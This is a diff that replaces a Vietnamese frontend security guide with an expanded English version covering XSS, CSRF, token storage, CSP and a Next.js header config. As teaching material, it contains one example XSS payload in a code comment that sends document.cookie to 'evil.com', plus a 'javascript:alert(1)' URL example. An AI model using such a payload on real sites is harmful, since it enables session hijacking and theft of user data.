@@ -1,63 +1,189 @@
-# Frontend Security (Advanced)
+# Frontend Security
 
-Bảo mật không chỉ là việc của Backend. Lỗ hổng ở Frontend thường nhắm trực tiếp vào End-user.
+> A comprehensive guide to frontend security covering XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), secure token storage strategies (HttpOnly Cookies vs. localStorage), and Content Security Policy (CSP). Frontend security vulnerabilities directly target end users and their sessions.
 
-## 1. XSS (Cross-Site Scripting)
+---
 
-Hacker chèn mã JavaScript độc hại vào trang web của bạn (qua comment, URL), và khi user khác xem trang, đoạn JS đó chạy và đánh cắp Cookie/Token.
+## 1. What is it? (What)
 
-### Phân loại
-- **Stored XSS:** Hacker lưu JS độc vào Database. Bất kỳ ai mở bài viết đó đều dính.
-- **Reflected XSS:** JS độc nằm trên URL `?search=<script>...`. Server phản hồi thẳng đoạn chữ đó ra HTML.
-- **DOM-based XSS:** Hoàn toàn do Frontend (nhét parameter từ URL thẳng vào `innerHTML`).
+**Frontend Security** encompasses the practices and mechanisms used to protect web applications from attacks that exploit the client-side execution environment (browser). Unlike backend security, frontend attacks target the user's browser session, cookies, and personal data.
 
-### Cách phòng chống trong Frontend
-1. **Tuyệt đối không dùng `innerHTML` (hoặc `dangerouslySetInnerHTML` trong React)** trừ khi cực kỳ cần thiết và data đó đã được **Sanitize** (làm sạch).
-2. Dùng thư viện `DOMPurify` để lọc thẻ `<script>` khỏi chuỗi HTML.
-```javascript
-import DOMPurify from 'dompurify';
-const cleanHTML = DOMPurify.sanitize(dirtyUserHTML);
-<div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
+### Classification
+- **Type**: Application security discipline.
+- **Primary threats**: XSS, CSRF, clickjacking, token theft, supply chain attacks.
+- **Defense layers**: Input sanitization, CSP headers, secure cookie attributes, Subresource Integrity (SRI).
+
+---
+
+## 2. Why does it exist? (Why)
+
+Browsers execute arbitrary JavaScript from any origin that manages to inject it into a page. This trust model creates attack surfaces that backend security alone cannot address:
+
+| Threat | Impact | Frontend responsibility |
+|---|---|---|
+| XSS (Stored/Reflected/DOM) | Session hijacking, data theft | Sanitize inputs, avoid `innerHTML`, enforce CSP |
+| CSRF | Unauthorized actions on behalf of user | Use `SameSite` cookies, anti-CSRF tokens |
+| Token theft | Full account takeover | Use `HttpOnly` cookies instead of `localStorage` |
+| Clickjacking | User tricked into clicking hidden elements | `X-Frame-Options` / CSP `frame-ancestors` |
+
+---
+
+## 3. Without vs. With Comparison (Compare)
+
+### Without proper security
+
+```typescript
+// Vulnerable: renders user-provided HTML directly
+function Comment({ html }: { html: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: html }} />;
+  // If html contains <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
+  // the attacker steals every viewer's session cookie
+}
+
+// Vulnerable: token in localStorage — accessible to any XSS
+localStorage.setItem("token", accessToken);
 ```
-3. React tự động escape biến trong `{variable}` nên khá an toàn với XSS cơ bản.
+
+### With proper security
+
+```typescript
+import DOMPurify from "dompurify";
+
+// Safe: HTML is sanitized before rendering
+function Comment({ html }: { html: string }) {
+  const cleanHtml = DOMPurify.sanitize(html);
+  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
+}
+
+// Safe: token stored in HttpOnly cookie (set by backend)
+// JavaScript cannot access HttpOnly cookies — immune to XSS theft
+// The browser automatically attaches the cookie to requests
+```
+
+| Aspect | Without security | With security |
+|---|---|---|
+| User HTML rendering | Raw injection (XSS vector) | Sanitized with DOMPurify |
+| Token storage | localStorage (XSS accessible) | HttpOnly cookie (JS inaccessible) |
+| CSRF protection | None | SameSite cookie + CSRF token |
+| Script injection | Unrestricted | CSP restricts allowed sources |
 
 ---
 
-## 2. Token Storage (Vấn đề lưu JWT)
+## 4. Common Use Cases
 
-Nên lưu Access Token ở đâu?
-
-### A. LocalStorage / SessionStorage
-- **Dễ dùng**, Frontend đọc được ngay lập tức để gửi đi qua Header `Authorization: Bearer`.
-- **LỖI BẢO MẬT CHÍNH:** Dễ bị tấn công XSS. Bất kỳ mã JS độc hại nào (từ extention trình duyệt, thẻ script lạ) đều có thể `localStorage.getItem('token')` và gửi về server hacker.
-
-### B. HttpOnly Cookies (Best Practice hiện đại)
-- Token được Backend set vào Cookie với cờ `HttpOnly` và `Secure`.
-- Trình duyệt sẽ tự động đính kèm Cookie này trong mọi Request gửi đến Backend đó.
-- **BẢO MẬT TUYỆT ĐỐI KHỎI XSS:** JavaScript ở Frontend KHÔNG THỂ đọc được HttpOnly Cookie (`document.cookie` không thấy).
-- **Rủi ro CSRF:** Dùng cookie sẽ mở ra rủi ro CSRF, nhưng hiện nay cờ `SameSite=Lax` hoặc `Strict` trong Cookie đã giải quyết gần triệt để vấn đề này.
+1. **User-generated content platforms** — Blog comments, forum posts, rich text editors require XSS sanitization.
+2. **Authentication flows** — Secure token storage and automatic token refresh.
+3. **Third-party script management** — Analytics, ads, and widgets introduce supply chain risk.
+4. **E-commerce checkout** — CSRF protection for payment and order submission forms.
+5. **Admin dashboards** — Elevated privileges require defense-in-depth (CSP + strict auth + CSRF).
 
 ---
 
-## 3. CSRF (Cross-Site Request Forgery)
+## 5. Deep Practice
 
-Hacker lừa user bấm vào một nút trên web của Hacker (`hacker.com`), nhưng đằng sau nút bấm đó là một request ngầm gửi đến `your-bank.com/transfer`. Vì user đang đăng nhập ở ngân hàng, trình duyệt tự động gửi kèm Cookie, thế là tiền bị chuyển đi.
+### XSS Prevention
 
-### Cách phòng thủ:
-- **SameSite Cookie:** Đặt cờ `SameSite=Lax` hoặc `Strict` khi Backend set cookie. Trình duyệt sẽ không gửi Cookie đi nếu request xuất phát từ domain khác (`hacker.com`).
-- **Anti-CSRF Tokens:** Backend sinh 1 token ẩn giấu trong thẻ `<meta>` hoặc form ẩn. Hacker không thể lấy được token đó.
+1. **React's built-in protection** — JSX expressions `{variable}` are automatically escaped. This prevents basic XSS.
+2. **Avoid `dangerouslySetInnerHTML`** — When unavoidable, always sanitize with DOMPurify first.
+3. **Never use `innerHTML` in vanilla JS** — Use `textContent` or DOM APIs instead.
+4. **Sanitize URL inputs** — User-provided URLs in `href` can execute JavaScript: `javascript:alert(1)`.
+5. **Validate on both client and server** — Client-side validation is a UX feature, not a security boundary.
 
----
+### Secure Token Storage
 
-## 4. Content Security Policy (CSP)
+| Storage | XSS vulnerable | CSRF vulnerable | Recommendation |
+|---|---|---|---|
+| `localStorage` | Yes — any JS can read it | No | Avoid for sensitive tokens |
+| `sessionStorage` | Yes — any JS can read it | No | Avoid for sensitive tokens |
+| `HttpOnly` Cookie | No — JS cannot access it | Yes (mitigated by `SameSite`) | **Recommended** |
+| In-memory variable | No (unless XSS executes) | No | Good for short-lived access tokens |
 
-Một lớp khiên phòng thủ cực mạnh bằng HTTP Header gửi từ Server. Nó quy định trình duyệt CHỈ được tải tài nguyên (Images, Scripts, Styles) từ các domain được chỉ định.
+**Recommended approach**: Backend sets the access token in an `HttpOnly`, `Secure`, `SameSite=Lax` cookie. The browser automatically attaches it to every request. Frontend JavaScript never handles the token directly.
 
-Ví dụ: Nếu trang của bạn dính lỗ hổng XSS (Hacker chèn được script gọi về `hacker.com/steal`), nhưng bạn đã thiết lập CSP:
+### CSRF Protection
+
+- **`SameSite=Lax` or `Strict` cookies**: The browser does not send cookies on cross-origin requests from other domains.
+- **Anti-CSRF tokens**: Backend generates a unique token per session, embedded in forms as a hidden field. Cross-origin attackers cannot obtain this token.
+- **Custom headers**: Require a custom header (e.g., `X-Requested-With`) on all state-changing requests. Browsers enforce CORS preflight for custom headers, blocking cross-origin requests.
+
+### Content Security Policy (CSP)
+
+CSP is an HTTP header that restricts which resources the browser is allowed to load.
+
 ```http
-Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com
 ```
-Trình duyệt sẽ BÁO LỖI VÀ CHẶN đoạn mã XSS đó lại vì `hacker.com` không nằm trong danh sách trắng (`trusted.cdn.com`).
 
-> [!IMPORTANT]
-> Frontend Devs thường cấu hình CSP qua thẻ `<meta>` trong Next.js `Document` hoặc bằng Next.js `headers()` config trong `next.config.js`.
+Even if an XSS vulnerability exists, CSP prevents the injected script from loading external resources or exfiltrating data to attacker-controlled domains.
+
+### Best Practices
+
+1. **Use `HttpOnly` cookies for authentication tokens** — Eliminates the primary XSS token theft vector.
+2. **Deploy CSP headers in production** — Start with `report-only` mode to avoid breaking functionality.
+3. **Never trust client-side input** — All validation must be duplicated on the server.
+4. **Use Subresource Integrity (SRI)** for third-party CDN scripts to prevent supply chain attacks.
+5. **Audit third-party dependencies** — Run `npm audit` in CI pipelines; use `Socket.dev` or `Snyk` for deep analysis.
+
+### Common Pitfalls
+
+1. **Storing JWTs in localStorage** — The most common frontend security mistake. Any XSS vulnerability exposes the token.
+2. **Trusting `dangerouslySetInnerHTML` with unsanitized content** — Directly enables Stored XSS.
+3. **CSP too permissive** — `script-src 'unsafe-inline' 'unsafe-eval'` negates CSP's protection entirely.
+4. **Forgetting `SameSite` on cookies** — Without it, CSRF attacks are possible.
+5. **Not validating `javascript:` URLs** — User-provided URLs in `href` can execute arbitrary code.
+
+### Production Checklist
+
+- [ ] Authentication tokens stored in `HttpOnly`, `Secure`, `SameSite=Lax` cookies.
+- [ ] No `dangerouslySetInnerHTML` without DOMPurify sanitization.
+- [ ] CSP header deployed (at minimum `default-src 'self'`).
+- [ ] `npm audit` integrated into CI pipeline.
+- [ ] SRI attributes on all third-party CDN scripts.
+- [ ] URL inputs validated against `javascript:` protocol injection.
+
+---
+
+## 6. Code Templates and Integration
+
+### Next.js CSP Configuration
+
+```typescript
+// next.config.ts
+const cspHeader = `
+  default-src 'self';
+  script-src 'self' 'nonce-{NONCE}';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' blob: data: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+`.replace(/\n/g, "");
+
+const nextConfig = {
+  async headers() {
+    return [
+      {
+        source: "/(.*)",
+        headers: [
+          { key: "Content-Security-Policy", value: cspHeader },
+          { key: "X-Frame-Options", value: "DENY" },
+          { key: "X-Content-Type-Options", value: "nosniff" },
+          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        ],
+      },
+    ];
+  },
+};
+
+export default nextConfig;
+```
+
+---
+
+## Related Topics
+
+- [API Layer Design](./api-layer-design.md) — Token refresh interceptors and secure HTTP client configuration.
+- [App Router & React Server Components](../03-nextjs/app-router-rsc.md) — Server-side authentication with Server Components.
+- [Web Security (Fundamentals)](../../01-fundamentals/security/web-security.md) — OWASP Top 10 and foundational security concepts.
